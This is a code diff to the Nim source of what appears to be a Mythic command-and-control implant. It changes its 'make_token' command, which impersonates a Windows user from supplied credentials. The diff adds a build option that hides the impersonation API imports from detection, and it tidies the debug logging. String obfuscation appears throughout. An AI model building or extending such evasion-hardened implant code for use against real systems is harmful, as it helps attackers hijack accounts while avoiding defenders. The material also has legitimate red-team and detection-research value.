@@ -5,7 +5,11 @@ import ../utils/strenc
 import token_manager
 
 when defined(windows):
-  import winim/lean
+  when defined(evasion_dfr):
+    import winim/lean except ImpersonateLoggedOnUser, RevertToSelf
+    import ../utils/winapi
+  else:
+    import winim/lean
   
   proc makeToken*(taskId: string, params: JsonNode): JsonNode =
     ## Create a new logon token and impersonate it
@@ -24,7 +28,7 @@ when defined(windows):
       if password.len == 0:
         return mythicError(taskId, obf("Password cannot be empty"))
       
-      debug &"[DEBUG] make_token: user={domain}\\{username}, netOnly={netOnly}"
+      debugLog "make_token", &"make_token: user={domain}\\{username}, netOnly={netOnly}"
       
       # Convert strings to wide strings
       let usernameW = +$username
@@ -61,7 +65,7 @@ when defined(windows):
       # Get the new user context (after impersonation)
       let newUser = getCurrentUsername()
       
-      debug &"[DEBUG] Successfully impersonated: {newUser}"
+      debugLog "make_token", &"Successfully impersonated: {newUser}"
       
       # Build response with callback data
       return mythicCallback(taskId, obf("Successfully impersonated ") & newUser, %*{
